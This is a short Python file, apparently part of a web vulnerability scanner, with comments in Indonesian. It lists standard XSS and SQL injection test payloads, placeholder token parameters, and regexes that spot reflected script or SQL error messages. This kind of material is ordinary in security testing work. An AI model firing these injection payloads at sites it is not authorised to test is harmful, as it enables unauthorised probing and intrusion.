import re

# Payload untuk XSS (Reflected & Stored)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'';!--\"<XSS>=&{()}",
    "<img src=x onerror=alert(1)>",
    "\" onmouseover=\"alert(1)\"",
    "<svg/onload=alert(1)>"
]

# Payload untuk SQL Injection
SQLI_PAYLOADS = [
    "' OR 1=1 -- ",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND 1=2 -- "
]

# Payload untuk API Key/Token (Contoh sederhana, perlu konteks endpoint)
TOKEN_CHECK_PAYLOADS = [
    "admin_token=test_token",
    "api_key=test_key"
]

# Regex untuk mendeteksi keberhasilan (contoh)
XSS_DETECTION_REGEX = re.compile(r"<script>alert\(1\)</script>")
SQLI_ERROR_REGEX = re.compile(r"mysql_fetch_array|syntax error|unclosed quotation mark", re.IGNORECASE)